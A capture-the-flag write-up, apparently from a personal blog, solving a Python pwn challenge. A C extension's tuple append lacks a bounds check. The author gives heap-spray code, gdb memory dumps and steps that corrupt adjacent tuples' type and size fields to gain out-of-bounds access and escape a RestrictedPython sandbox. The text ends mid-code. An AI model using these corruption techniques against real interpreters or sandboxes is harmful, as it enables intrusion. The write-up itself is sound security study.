@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+
+  <script type="text/javascript" id="MathJax-script" async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+  </script>
+<script type="text/javascript">
+window.MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']],
+    displayMath: [['$$', '$$'], ['\\[', '\\]']]
+  },
+  chtml: {
+    scale: 1.10   /* Increase font size: 1.0 = default, 1.5 = 150% */
+  }
+};
+</script>
+  <title>sctf/upsolves</title><!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="sctf/upsolves" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="recommended listening for this post is 明日にはすべてが終わるとして by kinokoteikoku." />
+<meta property="og:description" content="recommended listening for this post is 明日にはすべてが終わるとして by kinokoteikoku." />
+<link rel="canonical" href="http://localhost:4000/2025/11/19/sctf-upsolves.html" />
+<meta property="og:url" content="http://localhost:4000/2025/11/19/sctf-upsolves.html" />
+<meta property="og:site_name" content="wrenches" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-11-19T00:40:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="sctf/upsolves" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-11-19T00:40:00+08:00","datePublished":"2025-11-19T00:40:00+08:00","description":"recommended listening for this post is 明日にはすべてが終わるとして by kinokoteikoku.","headline":"sctf/upsolves","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2025/11/19/sctf-upsolves.html"},"url":"http://localhost:4000/2025/11/19/sctf-upsolves.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="wrenches" /><link rel="shortcut icon" type="image/x-icon" href="" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+
+</head>
+<body a="dark">
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/"></a><article>
+  <p class="post-meta">
+    <time datetime="2025-11-19 00:40:00 +0800">2025-11-19 00:40:00 +0800</time>
+  </p>
+  
+  <h1>sctf/upsolves</h1>
+
+  <p>recommended listening for this post is <a href="https://www.youtube.com/watch?v=yuXaABIr0go&amp;list=PL8Xbf2xl0OGBgCZw4kyzpulGkXN1f0ZQM&amp;index=9"> 明日にはすべてが終わるとして</a> by kinokoteikoku.</p>
+
+<p><img src="https://i.imgur.com/JIUaiNl.png" alt="image" /></p>
+
+<p><a href="https://blog.azazo.me">azazo</a> and i did this ctf alongside one other friend. the event is long gone now but i decided to upsolve this python pwn challenge by <a href="https://samuzora.com">samuzora</a> that i thought was really fun. it took me about 8 hours.</p>
+
+<p><strong>edit 24th jan</strong> i also upsolved one of the unsolved revs, attached below</p>
+
+<h3 id="pwnmutuple">pwn/mutuple</h3>
+
+<blockquote>
+  <p>I made tuples mutable… you can call them mutuples ecks dee</p>
+
+  <p>by samuzora</p>
+
+  <p>0 solves</p>
+</blockquote>
+
+<p>wah 0 solves fucking kena this one</p>
+
+<p>the challenge introduces a custom <code class="language-plaintext highlighter-rouge">mutuple</code> library with an <code class="language-plaintext highlighter-rouge">append</code> function.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define PY_SSIZE_T_CLEAN
+#include</span> <span class="cpf">&lt;python3.9/Python.h&gt;</span><span class="cp">
+</span>
+<span class="n">PyObject</span> <span class="o">*</span><span class="nf">PyInit_mutuple</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+
+<span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span><span class="nf">method_append</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="p">);</span>
+
+<span class="n">PyMethodDef</span> <span class="n">methods</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> 
+  <span class="p">{</span>
+    <span class="p">.</span><span class="n">ml_name</span> <span class="o">=</span> <span class="s">"append"</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">ml_meth</span> <span class="o">=</span> <span class="n">method_append</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">ml_flags</span> <span class="o">=</span> <span class="n">METH_VARARGS</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="n">PyModuleDef</span> <span class="n">definition</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="p">.</span><span class="n">m_name</span> <span class="o">=</span> <span class="s">"mutuple"</span><span class="p">,</span>
+  <span class="p">.</span><span class="n">m_methods</span> <span class="o">=</span> <span class="n">methods</span><span class="p">,</span>
+<span class="p">};</span>
+
+<span class="n">PyObject</span> <span class="o">*</span><span class="nf">PyInit_mutuple</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">PyModule_Create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">definition</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span><span class="nf">method_append</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">self</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">PyTupleObject</span> <span class="o">*</span><span class="n">the_tuple</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="n">PyObject</span> <span class="o">*</span><span class="n">to_add</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PyArg_UnpackTuple</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="s">"ref"</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">the_tuple</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">to_add</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PyTuple_Check</span><span class="p">(</span><span class="n">the_tuple</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">PyErr_SetString</span><span class="p">(</span><span class="n">PyExc_TypeError</span><span class="p">,</span> <span class="s">"first argument must be of type tuple"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="n">the_tuple</span><span class="o">-&gt;</span><span class="n">ob_item</span><span class="p">[</span><span class="n">the_tuple</span><span class="o">-&gt;</span><span class="n">ob_base</span><span class="p">.</span><span class="n">ob_size</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">to_add</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="n">Py_True</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="setup">setup</h3>
+
+<p>getting this setup on your local machine is actually nontrivial, esp. if you want debug symbols on python (which are super nice to have due to the struct definitions being given for you). consulting the Dockerfile we can see that it’s python 3.9, so let’s get python 3.9 and compile it with debug symbols. the process for this is shown in my <a href="https://slight-smile.com/writeups/infobahn-ctf-25/">rev/disthis writeup</a> over on the slight-smile website (check us out ^_^) so i won’t belabor the point.</p>
+
+<p>the key thing you’ll want to do is copy the provided compiled library (with debug symbols also, bless u lucas) into the correct directory, in this case it’s <code class="language-plaintext highlighter-rouge">/Python-3.9.0/build/lib.linux-x86_64-3.9-pydebug</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>.linux-x86_64-3.9-pydebug<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">ls
+</span>array.cpython-39d-x86_64-linux-gnu.so             _opcode.cpython-39d-x86_64-linux-gnu.so
+_asyncio.cpython-39d-x86_64-linux-gnu.so          ossaudiodev.cpython-39d-x86_64-linux-gnu.so
+audioop.cpython-39d-x86_64-linux-gnu.so           parser.cpython-39d-x86_64-linux-gnu.so
+binascii.cpython-39d-x86_64-linux-gnu.so          _pickle.cpython-39d-x86_64-linux-gnu.so
+_bisect.cpython-39d-x86_64-linux-gnu.so           _posixshmem.cpython-39d-x86_64-linux-gnu.so
+_blake2.cpython-39d-x86_64-linux-gnu.so           _posixsubprocess.cpython-39d-x86_64-linux-gnu.so
+</code></pre></div></div>
+
+<p>this is where all the library nonsense lies. we can verify that the library is installed by calling <code class="language-plaintext highlighter-rouge">from mutuple import *</code>, here is me demoing the functionality.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">mutuple</span> <span class="kn">import</span> <span class="n">append</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">append</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="bp">True</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span>
+<span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>lovely let’s get on with the solve</p>
+
+<h3 id="primitive-oob-write-of-pointers">primitive: oob write of pointers</h3>
+
+<p>to be honest i didn’t actually dig too deep into the source code itself, i just kept whacking in gdb until i got a crash. but to explain the functionality, there’s no quote-unquote ‘bounds’ check as to the allocated area dedicated for the tuple, so if we keep appending to the given tuple, we’ll inevitably overwrite some adjacent tuples.</p>
+
+<p>a major problem and annoyance w/ python pwn is that python seems to allocate objects wherever the fuck it feels like, thus making offsets wildly inconsistent. you can have a working solve script that relies on a baked-in offset, keep making edits to it, and then it completely whacks up the offset. we circumvent this by allocating a bunch of tuples, checking the offsets of adjacent items in memory, and just hoping we get a nice number. here is some code that does exactly that, we just spray and pray and hope for two tuples at offset <code class="language-plaintext highlighter-rouge">0x50</code> from one another.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vals</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">vm</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">print_</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
+    <span class="n">vals</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">i</span><span class="p">,))</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">id</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="nb">id</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="o">==</span> <span class="mh">0x50</span><span class="p">:</span>
+            <span class="n">offset</span> <span class="o">=</span> <span class="n">i</span><span class="o">-</span><span class="mi">1</span>
+            <span class="k">break</span>
+
+<span class="n">vm</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">])</span>
+<span class="n">vm</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span>
+<span class="nb">input</span><span class="p">(</span><span class="s">'...'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>at this point in the challenge it behooves us to learn a bit more about the <code class="language-plaintext highlighter-rouge">PyTupleObject</code> struct as defined in <code class="language-plaintext highlighter-rouge">CPython</code>. lucas samuzora tan has a really good deep-dive into this on his author writeup for the challenge so i won’t belabor the point, i’ll just go over what is strictly necessary to solve the challenge. we’ll get the address of one of our tuples and poke around in it in gdb.</p>
+
+<p>again, note that compiling with symbols is <em>really</em> nice because we can automatically resolve all these type definitions and struct formats.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="n">PyTupleObject</span><span class="o">*</span><span class="p">)</span><span class="mh">0x7ffff755ce10</span>
+<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="n">ob_base</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">ob_base</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">ob_refcnt</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">,</span>
+      <span class="n">ob_type</span> <span class="o">=</span> <span class="mh">0x5555558fc020</span> <span class="o">&lt;</span><span class="n">PyTuple_Type</span><span class="o">&gt;</span>
+    <span class="p">},</span>
+    <span class="n">ob_size</span> <span class="o">=</span> <span class="mh">0x1</span>
+  <span class="p">},</span>
+  <span class="n">ob_item</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="p">[</span><span class="mh">0x0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x7ffff7cb6380</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>the important things here are <code class="language-plaintext highlighter-rouge">ob_size</code>, <code class="language-plaintext highlighter-rouge">ob_type</code>, and <code class="language-plaintext highlighter-rouge">ob_item</code>. <code class="language-plaintext highlighter-rouge">ob_size</code> is the number of items in the tuple, <code class="language-plaintext highlighter-rouge">ob_type</code> is a pointer to the <code class="language-plaintext highlighter-rouge">type</code> object in Python, and <code class="language-plaintext highlighter-rouge">ob_item</code> is an array containing pointers to everything in the tuple.</p>
+
+<p>viewing the raw bytes and eyepowering the structs we can see the two tuples, almost side-by-side:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">16</span><span class="n">x</span> <span class="mh">0x7ffff759f820</span>
+
+<span class="p">[</span><span class="n">here</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">first</span> <span class="nb">tuple</span><span class="p">]</span>
+<span class="mh">0x7ffff759f820</span><span class="p">:</span>	<span class="mh">0x0000000000000001</span>	<span class="mh">0x00005555558fc020</span>
+<span class="mh">0x7ffff759f830</span><span class="p">:</span>	<span class="mh">0x0000000000000001</span>	<span class="mh">0x00007ffff7cb3e40</span> <span class="o">&lt;-</span> <span class="p">[</span><span class="n">here</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">first</span> <span class="nb">object</span><span class="p">]</span>
+<span class="mh">0x7ffff759f840</span><span class="p">:</span>	<span class="mh">0xfdfdfdfdfdfdfdfd</span>	<span class="mh">0xdddddddddddddddd</span>
+
+<span class="p">[</span><span class="n">i</span> <span class="n">have</span> <span class="n">no</span> <span class="n">idea</span> <span class="n">what</span> <span class="n">this</span> <span class="n">nonsense</span> <span class="ow">is</span><span class="p">]</span>
+<span class="mh">0x7ffff759f850</span><span class="p">:</span>	<span class="mh">0x3000000000000000</span>	<span class="mh">0xfdfdfdfdfdfdfd6f</span>
+<span class="mh">0x7ffff759f860</span><span class="p">:</span>	<span class="mh">0x0000555555949fb0</span>	<span class="mh">0x00007ffff759f810</span>
+
+<span class="p">[</span><span class="n">here</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">second</span> <span class="nb">tuple</span><span class="p">]</span>
+<span class="mh">0x7ffff759f870</span><span class="p">:</span>	<span class="mh">0x0000000000000001</span>	<span class="mh">0x00005555558fc020</span>
+<span class="mh">0x7ffff759f880</span><span class="p">:</span>	<span class="mh">0x0000000000000001</span>	<span class="mh">0x00007ffff7cb3e80</span>
+<span class="mh">0x7ffff759f890</span><span class="p">:</span>	<span class="mh">0xfdfdfdfdfdfdfdfd</span>	<span class="mh">0xdddddddddddddddd</span>
+</code></pre></div></div>
+
+<p>the tuples are basically almost kissing. given that each <code class="language-plaintext highlighter-rouge">.append()</code> occupies one qword, we can eyepower and see we need to append 6 qwords to get through all the garbage, and then our next <code class="language-plaintext highlighter-rouge">.append()</code> would start impacting struct metadata. we whack once to impact <code class="language-plaintext highlighter-rouge">ob_refcnt</code>, then another time to whack <code class="language-plaintext highlighter-rouge">ob_type</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'rawr'</span><span class="p">)</span>
+
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'woof'</span><span class="p">)</span> <span class="c1"># &lt;- now we whack the ob_refcnt, which doesnt do much
+</span><span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'meow'</span><span class="p">)</span> <span class="c1"># &lt;- this one kena whack the ob_type
+</span>
+<span class="n">print_</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]))</span>
+<span class="nb">input</span><span class="p">(</span><span class="s">'...'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>running this, we’ll see that our <code class="language-plaintext highlighter-rouge">type</code> for the second tuple is now altered.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>starting the exploit...
+0x7ff988963be0
+0x7ff988963c30
+tuple <span class="nb">type</span> <span class="o">&gt;</span>  meow
+</code></pre></div></div>
+
+<p>epic. an important caveat of this write is that we are currently unable to write arbitrary bytes, just pointers to objects. say, if we wanted to write nulls to some fields, we just couldn’t, because no Python function is able to return a nullptr without erroring out.</p>
+
+<p>so what do we do? given that we can still whack <code class="language-plaintext highlighter-rouge">ob_size</code>, we can create a tuple that’s just, really fucking big:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'rawr'</span><span class="p">)</span>
+
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'woof'</span><span class="p">)</span>
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="nb">tuple</span><span class="p">)</span> <span class="c1"># &lt;- we actually don't want to alter our struct's type here
+</span><span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'meow'</span><span class="p">)</span> <span class="c1"># &lt;- this whacks the ob_size
+</span>
+<span class="n">vuln</span> <span class="o">=</span> <span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'tuple type &gt; '</span><span class="p">,</span> <span class="nb">type</span><span class="p">(</span><span class="n">vuln</span><span class="p">))</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'tuple size &gt; '</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">vuln</span><span class="p">))</span>
+<span class="nb">input</span><span class="p">(</span><span class="s">'...'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>a neat hack here is that if we want to get to <code class="language-plaintext highlighter-rouge">ob_size</code>, we’ll naturally have to whack <code class="language-plaintext highlighter-rouge">ob_type</code>. we don’t actually want to whack <code class="language-plaintext highlighter-rouge">ob_type</code>! but since we’re able to write <em>pointers</em>, we have access to the <code class="language-plaintext highlighter-rouge">tuple</code> pointer by directly writing <code class="language-plaintext highlighter-rouge">tuple</code>.</p>
+
+<p>this results in our huge tuple.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>ves/pwn-mutuple/src/chall<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">cp </span>fuzz.py /tmp/fuzz.py<span class="p">;</span> ./python run.py fuzz.py
+starting the exploit...
+0x7f3ccf0b0190
+0x7f3ccf0b01e0
+tuple <span class="nb">type</span> <span class="o">&gt;</span>  &lt;class <span class="s1">'tuple'</span><span class="o">&gt;</span>
+tuple size <span class="o">&gt;</span>  139899148097392
+</code></pre></div></div>
+
+<p>this is OOB read. the thing is, we still can’t read raw bytes, because when we index into the tuple, it dereferences the pointer at that index of the <code class="language-plaintext highlighter-rouge">ob_item</code> array - it doesn’t actually return the bytes themselves.</p>
+
+<p>the question then becomes: how do we <em>forge</em> bytes? in other python pwn a really handy tool is <code class="language-plaintext highlighter-rouge">bytearray</code>, but the challenge does not give us access to this :(</p>
+
+<p>instead we can just write bytes, with, well, <code class="language-plaintext highlighter-rouge">bytes</code>. the <code class="language-plaintext highlighter-rouge">bytes</code> object actually does contain the raw bytes written to it as a contiguous section in one of its struct fields. let’s demonstrate by creating a <code class="language-plaintext highlighter-rouge">bytes</code> object and analysing it.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">b</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'rawr rawr woof'</span>
+<span class="n">print_</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="n">b</span><span class="p">)))</span>
+<span class="nb">input</span><span class="p">(</span><span class="s">'...'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>hopping into gef:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="n">PyBytesObject</span><span class="o">*</span><span class="p">)</span><span class="mh">0x7ffff755c8b0</span>
+<span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="n">ob_base</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">ob_base</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">ob_refcnt</span> <span class="o">=</span> <span class="mh">0x2</span><span class="p">,</span>
+      <span class="n">ob_type</span> <span class="o">=</span> <span class="mh">0x5555558ed400</span> <span class="o">&lt;</span><span class="n">PyBytes_Type</span><span class="o">&gt;</span>
+    <span class="p">},</span>
+    <span class="n">ob_size</span> <span class="o">=</span> <span class="mh">0xe</span>
+  <span class="p">},</span>
+  <span class="n">ob_shash</span> <span class="o">=</span> <span class="mh">0xb57bd7371431d8f2</span><span class="p">,</span>
+  <span class="n">ob_sval</span> <span class="o">=</span> <span class="s">"r"</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>the <code class="language-plaintext highlighter-rouge">ob_sval</code> field is what we want here. we can print this as a string and verify the bytes are there.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="n">g</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">PyBytesObject</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x7ffff755c900</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">ob_sval</span>
+<span class="mh">0x7ffff755c920</span><span class="p">:</span>	<span class="mh">0x7761722072776172</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">PyBytesObject</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x7ffff755c900</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">ob_sval</span>
+<span class="mh">0x7ffff755c920</span><span class="p">:</span>	<span class="s">"rawr rawr woof"</span>
+</code></pre></div></div>
+
+<p>so this becomes our handy primitive to create raw bytes. we’ll use this to forge pointers to objects in the Python namespace - because we now have a really large tuple, as long as our forged tuple is <em>before</em> our forged bytes object in memory, we can just access it by indexing into the tuple.</p>
+
+<p>we will have to figure out something nice to forge. let’s actually look at the set-up for the challenge (it accepts a base64 encoded .py file and runs it with severe restrictions &gt; )</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3.9 -u
+</span><span class="kn">from</span> <span class="nn">mutuple</span> <span class="kn">import</span> <span class="n">append</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">modules</span><span class="p">,</span> <span class="n">argv</span>
+<span class="k">del</span> <span class="n">modules</span><span class="p">[</span><span class="s">'os'</span><span class="p">]</span>
+<span class="n">keys</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">__builtins__</span><span class="p">.</span><span class="n">__dict__</span><span class="p">.</span><span class="n">keys</span><span class="p">())</span>
+
+<span class="kn">from</span> <span class="nn">RestrictedPython</span> <span class="kn">import</span> <span class="n">compile_restricted</span><span class="p">,</span> <span class="n">safe_builtins</span>
+<span class="kn">from</span> <span class="nn">RestrictedPython.Eval</span> <span class="kn">import</span> <span class="n">default_guarded_getiter</span>
+<span class="kn">from</span> <span class="nn">RestrictedPython.Guards</span> <span class="kn">import</span> <span class="n">full_write_guard</span>
+
+<span class="kn">from</span> <span class="nn">operator</span> <span class="kn">import</span> <span class="n">getitem</span>
+
+<span class="k">def</span> <span class="nf">_inplacevar_</span><span class="p">(</span><span class="n">op</span><span class="p">,</span> <span class="n">var</span><span class="p">,</span> <span class="n">expr</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"+="</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">var</span> <span class="o">+</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"-="</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">var</span> <span class="o">-</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"*="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">*</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"/="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">/</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"%="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">%</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"**="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">**</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"&lt;&lt;="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">&lt;&lt;</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"&gt;&gt;="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">&gt;&gt;</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"|="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">|</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"^="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">^</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"&amp;="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">&amp;</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"//="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">//</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"@="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">//</span> <span class="n">expr</span>
+
+<span class="n">filename</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s">"/tmp/</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+    <span class="n">builtins</span> <span class="o">=</span> <span class="n">safe_builtins</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"_getitem_"</span><span class="p">]</span> <span class="o">=</span> <span class="n">getitem</span>
